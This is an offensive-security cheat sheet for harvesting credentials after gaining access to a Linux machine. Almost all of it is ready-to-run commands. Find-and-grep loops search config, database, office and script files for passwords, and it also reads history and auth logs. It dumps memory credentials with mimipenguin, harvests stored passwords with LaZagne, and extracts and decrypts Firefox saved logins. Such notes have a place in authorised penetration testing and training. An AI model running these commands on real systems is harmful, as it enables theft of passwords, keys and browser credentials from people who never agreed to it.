WHAT TO LOOK FOR IN LINUX:
Files including configs, databases, notes, scripts, source code, cronjobs, and SSH keys
History including logs, and command-line history
Memory including cache, and in-memory processing
Key-rings such as browser stored credentials


CONFIG FILE SEARCH:
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
(or current working dir)
for l in .conf .config .cnf; do echo -e "\nFile extension: $l"; find . -name "*$l" 2>/dev/null | grep -v "lib\|fonts\|share\|core"; done


USER:PASS SEARCH:
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
(or current working dir)
for i in $(find . -name '*.cnf' 2>/dev/null | grep -v "doc\|lib"); do echo -e "\nFile: $i"; grep -E "user|password|pass" "$i" 2>/dev/null | grep -v '^\s*#'; done
(support for office documents + results.txt)
find . \( -path "./lib" -o -path "./share" -o -path "./doc" \) -prune -o -type f \( -iname "*.doc" -o -iname "*.docx" -o -iname "*.xlsx" -o -iname "*.ppt" \) -print0 2>/dev/null | while IFS= read -r -d '' file; do matches=$(strings "$file" | grep -inE "user|password|pass" | grep -v '^\s*#'); [ -n "$matches" ] && echo "+++ [ FILE: $file ]" | tee -a results.txt && echo "$matches" | tee -a results.txt; done



DATABASE SEARCH:
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
(or current working dir)
for l in .sql .db .*db .db*; do echo -e "\nDB File extension: $l"; find . -name "*$l" 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"; done


NOTES SEARCH:
find /home/* -type f -name "*.txt" -o ! -name "*.*"
(or current working dir)
find /home/* -type f \( -name "*.txt" -o ! -name "*.*" \)


SCRIPTS SEARCH:
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
(or current working dir)
for l in .py .pyc .pl .go .jar .c .sh; do echo -e "\nFile extension: $l"; find . -name "*$l" 2>/dev/null | grep -v "doc\|lib\|headers\|share"; done



ENUMERATING CRONJOBS:
cat /etc/crontab


ENUMERATING HISTORY FILES:
tail -n5 /home/*/.bash*


ENUMERATING LOG FILES:
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

/var/log/messages		Generic system activity logs.
/var/log/syslog			Generic system activity logs.
/var/log/auth.log		(Debian) All authentication related logs.
/var/log/secure			(RedHat/CentOS) All authentication related logs.
/var/log/boot.log		Booting information.
/var/log/dmesg			Hardware and drivers related information and logs.
/var/log/kern.log		Kernel related warnings, errors and logs.
/var/log/faillog		Failed login attempts.
/var/log/cron			Information related to cron jobs.
/var/log/mail.log		All mail server related logs.
/var/log/httpd			All Apache related logs.
/var/log/mysqld.log		All MySQL server related logs.


CHECKING MEMORY & CACHE FOR CREDS:
sudo python3 mimipenguin.py


USING LAZAGNE.PY:
sudo python3 laZagne.py all
or specifically browsers:
python3 laZagne.py browsers

BROWSER CREDS:
ls -l .mozilla/firefox/ | grep default 
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

^DECRYPTING .DEFAULT:
python3 firefox_decrypt.py


